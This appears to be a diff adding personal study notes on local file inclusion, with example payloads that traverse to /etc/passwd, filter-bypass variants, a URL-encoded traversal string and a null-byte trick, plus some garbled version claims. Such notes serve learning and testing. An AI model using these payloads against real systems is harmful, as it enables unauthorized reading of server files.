@@ -1,1 +1,30 @@
+LFI
+https://book.hacktricks.xyz/pentesting-web/file-inclusion
+https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225
+LFI occurs when a parameter fetch a resource from server and we can instead make it fetch our requried files.
+    Sometimes server includes a filname or directory in the get parameter so we can bypass it by pre appending a / and then traverse to required file as sometimes server requires it
+NOtice how we preappended a / with etcpasswd location
 
+    http://example.com/?id=/../../../../../etc/passwd
+
+If server requires a specific keyword then we can add it first and then traverse to required location
+Bypassing Blackilisting
+    Sometimes server removes the ../ from our request and we cannot traverse direcotriees. To overcome this, we can simply either use .././ or ....// instead of a single ../. ,To demonstrate
+
+?param=../../../../../etc/passwd would become
+
+    ?param=....//....//....//....//....//etc/passwd
+
+         OR
+
+    ..//..//..//..//..//..//etc/passwd
+
+    We can also bypass string blacklisting by rule encoding .This works in php 5.3.4< .
+
+a ../ url encoded is %2e%2e%2f
+
+so our previous double slash bypass can be encoded as
+
+    %2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd
+
+    We can also make use of null byte which is %00. php versions 5.5< \ is vulnerable to this and we can use it to like bypass the append .php extension or few different things.
